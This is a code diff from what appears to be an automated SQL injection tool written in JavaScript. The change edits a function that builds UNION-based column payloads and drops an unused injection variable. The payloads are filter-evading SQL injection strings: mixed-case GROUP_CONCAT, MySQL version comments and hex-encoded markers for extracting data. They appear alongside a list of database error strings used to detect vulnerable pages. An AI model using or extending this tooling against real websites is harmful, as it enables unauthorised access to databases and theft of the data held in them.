@@ -122,15 +122,14 @@ sql_errors1 = ['Convo Not found!','rowCount()', 'RecordCount()', 'ERROR:', 'Warn
     
     async function BuscaIDresponse(url,colunas) {
         return new Promise(async function(resolve, reject){
-            var injection = 'GrOUp_COnCaT(0x6D7973716C6E6F74726F6E3D3E, 0x3a, 0x3C3D6D7973716C6E6F74726F6E)'
-        
+          
             for (i = 1; i < colunas + 1; i++) {
                 var stringcolunas = '';
                 for (i2 = 1; i2 < colunas + 1; i2++) {
                     if (i2 != i) {
                         stringcolunas = stringcolunas + i2
                     } else {
-                        stringcolunas = stringcolunas + '/*!50000gROup_cONcat(GrOUp_COnCaT(0x6D7973716C6E6F74726F6E3D3E, '+ i + ",0x3a,0x3a, 0x3C3D6D7973716C6E6F74726F6E)*/"
+                        stringcolunas = stringcolunas + '/*!50000gROup_cONcat(0x6D7973716C6E6F74726F6E3D3E, '+ i + ",0x3a,0x3a, 0x3C3D6D7973716C6E6F74726F6E)*/"
                     }
                     if( i2 < colunas ){
                         stringcolunas = stringcolunas + ','
